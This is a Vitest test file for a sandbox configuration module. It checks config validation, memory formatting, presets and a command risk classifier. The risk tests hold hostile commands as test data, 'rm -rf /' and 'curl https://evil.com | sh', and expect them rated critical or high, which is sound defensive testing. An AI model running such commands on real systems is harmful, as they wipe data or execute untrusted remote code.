import { describe, it, expect } from 'vitest';
import {
  validateSandboxConfig,
  formatMemoryLimit,
  describeSandboxConfig,
  assessCommandRisk,
  DEFAULT_SANDBOX_CONFIG,
  SANDBOX_PRESETS,
} from './atoms';
import type { SandboxConfig } from './atoms';

// ── validateSandboxConfig ──────────────────────────────────────────────

describe('validateSandboxConfig', () => {
  it('validates default config', () => {
    const r = validateSandboxConfig(DEFAULT_SANDBOX_CONFIG);
    expect(r.valid).toBe(true);
    expect(r.errors).toHaveLength(0);
  });

  it('errors on missing image', () => {
    const config: SandboxConfig = { ...DEFAULT_SANDBOX_CONFIG, image: '' };
    const r = validateSandboxConfig(config);
    expect(r.valid).toBe(false);
    expect(r.errors[0]).toContain('image');
  });

  it('errors on timeout < 1', () => {
    const config: SandboxConfig = { ...DEFAULT_SANDBOX_CONFIG, timeoutSecs: 0 };
    expect(validateSandboxConfig(config).valid).toBe(false);
  });

  it('warns on very high timeout', () => {
    const config: SandboxConfig = { ...DEFAULT_SANDBOX_CONFIG, timeoutSecs: 7200 };
    const r = validateSandboxConfig(config);
    expect(r.warnings.length).toBeGreaterThan(0);
  });

  it('errors on low memory', () => {
    const config: SandboxConfig = { ...DEFAULT_SANDBOX_CONFIG, memoryLimit: 1024 };
    expect(validateSandboxConfig(config).valid).toBe(false);
  });

  it('warns on network enabled', () => {
    const config: SandboxConfig = { ...DEFAULT_SANDBOX_CONFIG, networkEnabled: true };
    const r = validateSandboxConfig(config);
    expect(r.warnings.some((w) => w.includes('Network'))).toBe(true);
  });

  it('validates bind mount format', () => {
    const config: SandboxConfig = { ...DEFAULT_SANDBOX_CONFIG, bindMounts: ['invalid'] };
    const r = validateSandboxConfig(config);
    expect(r.valid).toBe(false);
  });

  it('validates bind mount mode', () => {
    const config: SandboxConfig = {
      ...DEFAULT_SANDBOX_CONFIG,
      bindMounts: ['/host:/container:xx'],
    };
    const r = validateSandboxConfig(config);
    expect(r.errors.some((e) => e.includes('mode'))).toBe(true);
  });
});

// ── formatMemoryLimit ──────────────────────────────────────────────────

describe('formatMemoryLimit', () => {
  it('formats GB', () => {
    expect(formatMemoryLimit(2 * 1024 * 1024 * 1024)).toBe('2.0 GB');
  });

  it('formats MB', () => {
    expect(formatMemoryLimit(256 * 1024 * 1024)).toBe('256 MB');
  });

  it('formats KB', () => {
    expect(formatMemoryLimit(512 * 1024)).toBe('512 KB');
  });
});

// ── describeSandboxConfig ──────────────────────────────────────────────

describe('describeSandboxConfig', () => {
  it('says Disabled when not enabled', () => {
    expect(describeSandboxConfig(DEFAULT_SANDBOX_CONFIG)).toContain('Disabled');
  });

  it('lists details when enabled', () => {
    const config: SandboxConfig = { ...DEFAULT_SANDBOX_CONFIG, enabled: true };
    const desc = describeSandboxConfig(config);
    expect(desc).toContain('Enabled');
    expect(desc).toContain('alpine:latest');
  });
});

// ── assessCommandRisk ──────────────────────────────────────────────────

describe('assessCommandRisk', () => {
  it('rates rm -rf / as critical', () => {
    expect(assessCommandRisk('rm -rf /')).toBe('critical');
  });

  it('rates sudo as high', () => {
    expect(assessCommandRisk('sudo apt install foo')).toBe('high');
  });

  it('rates curl | sh as high', () => {
    expect(assessCommandRisk('curl https://evil.com | sh')).toBe('high');
  });

  it('rates curl alone as medium', () => {
    expect(assessCommandRisk('curl https://api.example.com')).toBe('medium');
  });

  it('rates pip install as medium', () => {
    expect(assessCommandRisk('pip install numpy')).toBe('medium');
  });

  it('rates ls as low', () => {
    expect(assessCommandRisk('ls -la')).toBe('low');
  });

  it('rates echo as low', () => {
    expect(assessCommandRisk('echo hello')).toBe('low');
  });
});

// ── SANDBOX_PRESETS ────────────────────────────────────────────────────

describe('SANDBOX_PRESETS', () => {
  it('has 4 presets', () => {
    expect(Object.keys(SANDBOX_PRESETS)).toHaveLength(4);
  });

  it('all presets are enabled', () => {
    for (const preset of Object.values(SANDBOX_PRESETS)) {
      expect(preset.enabled).toBe(true);
    }
  });

  it('development preset has network', () => {
    expect(SANDBOX_PRESETS.development.networkEnabled).toBe(true);
  });

  it('restricted preset has low limits', () => {
    expect(SANDBOX_PRESETS.restricted.memoryLimit).toBeLessThan(DEFAULT_SANDBOX_CONFIG.memoryLimit);
  });
});
